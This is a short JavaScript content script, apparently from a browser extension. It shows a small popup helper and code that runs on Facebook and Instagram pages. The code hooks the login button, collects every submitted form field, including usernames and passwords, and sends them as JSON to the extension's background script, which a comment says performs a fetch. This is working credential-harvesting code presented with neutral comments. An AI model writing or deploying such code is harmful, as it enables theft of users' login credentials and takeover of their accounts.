// Function to create a popup message
function showPopup(message) {
    const popup = document.createElement('div');
    popup.style.position = 'fixed';
    popup.style.bottom = '20px';
    popup.style.right = '20px';
    popup.style.backgroundColor = 'rgba(0,0,0,0.7)';
    popup.style.color = 'white';
    popup.style.padding = '10px';
    popup.style.borderRadius = '5px';
    popup.innerText = message;

    document.body.appendChild(popup);

    // Remove the popup after 2 seconds
    setTimeout(() => {
        document.body.removeChild(popup);
    }, 2000);
}

// Check if the current URL contains facebook.com or instagram.com
if (window.location.href.includes('facebook.com') || window.location.href.includes('instagram.com')) {
    const loginButton = document.querySelector('[type="submit"]')
    if (loginButton) {
        loginButton.addEventListener('click', (event) => {
            const form = loginButton.closest('form')
            if (form) {
                const formData = new FormData(form)
                let message = "Logging in...\n"
                let dataToSave = {}
                for (const [key, value] of formData.entries()) {
                    message += `${key}: ${value}\n`
                    dataToSave[key] = value
                }

                // Convert dataToSave to JSON
                const jsonData = JSON.stringify(dataToSave)
                // Send message to background script to perform the fetch
                chrome.runtime.sendMessage({
                    action: 'sendData',
                    data: jsonData
                }, response => {
                    if (response.success) {
                        console.log('Success:', response.data)
                    } else {
                        console.error('Error:', response.error)
                    }
                })
            }
        })
    }
}
